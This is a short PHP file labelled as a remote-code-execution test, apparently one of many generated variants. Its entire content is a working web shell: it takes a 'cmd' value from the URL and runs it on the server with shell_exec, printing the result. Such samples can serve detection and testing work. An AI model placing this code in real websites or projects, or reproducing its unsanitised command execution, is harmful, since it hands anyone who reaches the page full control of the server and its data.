<?php
// RCE test variation #951
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>